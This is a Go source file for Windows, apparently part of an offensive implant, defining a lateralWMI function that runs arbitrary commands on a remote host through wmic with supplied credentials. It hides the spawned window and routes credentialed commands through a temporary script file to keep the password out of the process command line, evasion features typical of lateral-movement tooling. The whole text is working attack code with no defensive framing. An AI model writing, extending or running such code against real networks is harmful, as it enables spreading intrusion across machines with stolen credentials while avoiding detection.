//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
)

func lateralWMI(target, user, pass, cmd string) (string, error) {
	if cmd == "" {
		cmd = "whoami"
	}
	if user != "" && pass != "" {
		// Keep the password off the process command line (S3): run the wmic
		// invocation from a temp script file instead of embedding it in argv.
		script := fmt.Sprintf(`wmic /node:%s /user:%s /password:%s process call create "cmd.exe /c %s"`, target, user, pass, cmd)
		return runCmdScriptFile(script)
	}
	script := fmt.Sprintf(`wmic /node:%s process call create "cmd.exe /c %s"`, target, cmd)
	c := exec.Command("cmd", "/c", script)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	return string(out), err
}
